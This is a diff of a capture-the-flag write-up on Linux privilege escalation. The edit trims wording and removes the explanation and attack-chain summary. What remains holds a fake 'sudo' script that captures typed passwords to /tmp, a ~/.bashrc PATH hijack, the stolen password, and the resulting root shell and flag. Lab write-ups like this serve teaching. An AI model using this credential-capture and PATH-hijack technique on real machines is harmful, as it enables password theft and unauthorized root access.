@@ -41,9 +41,9 @@ Sorry, try again.
 sudo: 1 incorrect password attempt
 ```
 
-Frank is a member of the `sudo` group, meaning he *can* run commands as root — but only with his password, which we don't have. So `sudo -l` is a dead end without it.
+Frank is a member of the `sudo` group, meaning he *can* run commands as root but only with his password, which we don't have. So `sudo -l` is a dead end without it.
 
-This points toward monitoring the system for background/cron processes running as root that might leak a password or expose a privilege escalation path, rather than trying to brute-force Frank's password.
+This points towards monitoring the system for background/cron processes running as root that might leak a password or expose a privilege escalation path.
 
 ---
 
@@ -81,8 +81,6 @@ Letting `pspy64` run for a short while while a new SSH login occurs reveals the 
 
 This is **root (UID=0)** running `sudo cat /etc/shadow` — and critically, calling `sudo` **without specifying its full path** (`/usr/bin/sudo`). This fires around SSH login time, matching the `sshd: frank@pts/1` entries just before it.
 
-Because the script relies on `$PATH` to resolve `sudo`, this is exploitable via a **PATH hijack**: if a malicious executable named `sudo` is placed in a directory that appears *earlier* in `$PATH` than `/usr/bin/sudo`, root's process will run the fake `sudo` instead of the real one. Since the real `sudo` prompts interactively for a password, the fake binary can be used to capture that password.
-
 ---
 
 ## Building the Malicious `sudo` Binary
@@ -97,8 +95,8 @@ Contents of the fake `sudo` script:
 ```bash
 #!/usr/bin/bash
 
-read -sp 'Password: ' Password   # reads the user's password into the variable
-echo $Password > /tmp/passwd.txt # writes it out to /tmp/passwd.txt
+read -sp 'Password: ' Password   
+echo $Password > /tmp/passwd.txt 
 ```
 
 Make it executable:
@@ -119,7 +117,6 @@ frank@workstation:/tmp$ echo $PATH
 
 With `/tmp` prepended, any unqualified call to `sudo` in this shell now resolves to our fake binary first.
 
-However, `export PATH=...` only affects the *current* shell — and the root-owned process appears to fire fresh at each SSH login. So the hijack needs to persist across logins by being set in `~/.bashrc`, which is sourced automatically on every new interactive shell.
 
 ```bash
 frank@workstation:~$ nano ~/.bashrc
@@ -161,7 +158,7 @@ frank@workstation:~$ cat /tmp/passwd.txt
 !@#frankisawesome2022%*
 ```
 
-Boom — we get the password. 😉
+Boom!
 
 ---
 
@@ -184,18 +181,3 @@ flag.txt
 root@workstation:~# cat flag.txt
 flag{14370304172628f784d8e8962d54a600}
 ```
-
----
-
-## Summary — Attack Chain
-
-1. **Initial access** — Used Frank's leaked SSH private key to log in as `frank` on the target.
-2. **Enumeration** — Confirmed `frank` was in the `sudo` group but had no usable sudo access without his password.
-3. **Process monitoring** — Deployed `pspy64` (transferred via `scp`, since the target had no outbound internet) to observe background/root processes. Caught a root-owned process running `sudo cat /etc/shadow` **without a full path** to the `sudo` binary.
-4. **PATH hijack setup** — Wrote a malicious `sudo` script to `/tmp` that mimics the real password prompt and writes the captured password to `/tmp/passwd.txt`.
-5. **Persistence** — Prepended `/tmp` to `$PATH` inside `~/.bashrc` so the hijack survives a fresh login shell, since the root process fires around SSH login.
-6. **Credential capture** — Logged out and back in, triggering the root process to execute the fake `sudo`, capturing Frank's real password.
-7. **Privilege escalation** — Called `/usr/bin/sudo su` directly (bypassing the hijacked PATH) with the captured password to obtain a root shell.
-8. **Flag retrieval** — `flag{14370304172628f784d8e8962d54a600}`
-
-**Root cause:** A login-triggered process running `sudo cat /etc/shadow` without specifying `sudo`'s full path, combined with a user-writable directory (`/tmp`) being placeable ahead of system directories in `$PATH`. The fix is to hardcode full binary paths (`/usr/bin/sudo`) in any privileged script or cron job, and to never let a user-controllable `$PATH` reach a root-triggered process.
